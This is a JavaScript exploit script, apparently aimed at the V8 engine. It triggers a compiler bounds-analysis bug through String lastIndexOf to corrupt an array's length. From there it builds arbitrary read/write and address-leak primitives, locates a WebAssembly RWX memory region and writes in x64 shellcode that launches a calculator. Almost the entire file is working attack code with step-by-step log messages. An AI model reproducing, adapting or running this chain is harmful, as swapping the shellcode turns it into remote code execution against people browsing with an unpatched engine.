

let ab = new ArrayBuffer(8);
let fv = new Float64Array(ab);
let dv = new BigUint64Array(ab);

let f2i = (f) => 
{
    fv[0] = f;
      return dv[0];
}

let i2f = (i) => 
{
    dv[0] = BigInt(i);
      return fv[0];
}

let i2ba =(i) => 
 {
    dv[0] = BigInt(i);
    return Array.from(new Uint8Array(ab)).reverse(); 
}

let hexprintablei = (i) => 
{
    return "0x"+(i).toString(16).padStart(16,"0");
}





const shellcode = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00]
const newlength=i2f(0x0000100000000000); 
const log=print


const debug=true;

function yolo()
{
	let fakeme = new Array(0x41414141,0); 
	let arraybuffer = new ArrayBuffer(8); 
	let idx_size_arraybuffer = arr.indexOf(i2f(8)); 
	let backstore_ptr_idx = idx_size_arraybuffer+1; 
	log(backstore_ptr_idx)
	log("[+] Getting index for fakeme array")
	let idx=arr.indexOf(i2f(0x4141414100000000)); 
	log(idx)
	log("[+] Setting up R/W primitives")
	
	
	let read8 = (addr) =>
	{
		arr[backstore_ptr_idx]=i2f(addr); 
		let a = new DataView(arraybuffer); 
		if(debug)log(hexprintablei(f2i(a.getFloat64(0,true))));
		return f2i(a.getFloat64(0,true)) 
	}

	let write8 = (addr,data) =>
	{
		arr[backstore_ptr_idx]=i2f(addr); 
		let a = new Uint8Array(arraybuffer); 
		a.set(data); 
	}
	
	
	let writeaddr = (addr,data) =>
	{
		write8(ddr,i2ba(data)); 
	}
	 
	let addrof = (obj) =>
	{
		fakeme[0]=obj;         
		if(debug)log(hexprintablei(f2i(arr[idx])));
		return f2i(arr[idx]); 
	}
	
	log("[+] Getting RWX pointer from wasm")
	
	
	let wasm_addr=addrof(pwnme); 
	let shared_function_info=read8(wasm_addr+0x18n-1n); 
	let wasm_exported_function_data=read8(shared_function_info+8n-1n);
	let wasm_instance=read8(wasm_exported_function_data+0x10n-1n); 
	let jump_table_start=read8(wasm_instance+0x88n-1n); 
	
	
	
	
	
	
	
	log("[+] Address RWX : "+hexprintablei(jump_table_start))

	for (idxx = 0; idxx < shellcode.length / 8; idxx++)
		write8(jump_table_start+BigInt(idxx*8),shellcode.slice(idxx*8,(idxx+1)*8)) 
	
	log("[+] Spawning calc like its 1991 !")

	pwnme(); 
}

let arr;
function exploit() 
{
    var i = "A".repeat(2**30-25).lastIndexOf(''); 
    i = i + 25; 
    i = i >> 30; 
    i = i * 5 
   	arr = new Array(1.1, 1.2); 
    var value = arr[i]; 
    arr[i] = newlength; 
    if (value != undefined) { 
		if(arr.length!=0x1000) return 0; 
		log("[+] arr.length corrupted : size = "+arr.length)
		log("[+] Getting backstore pointer index")
		return 1;
    }
	return 0;
}




function test() {
  var wasmImports = { 
    env: {
      puts: function puts (index) {}
    }
  };
  var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
    96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
    116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
    131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
    109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
    128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
    65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]); 
  let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports); 
  return m; 
}

wasm_instance=test();
pwnme = wasm_instance.exports.hello; 

log("[+] Let's go !");
while(exploit()!=1); 
yolo()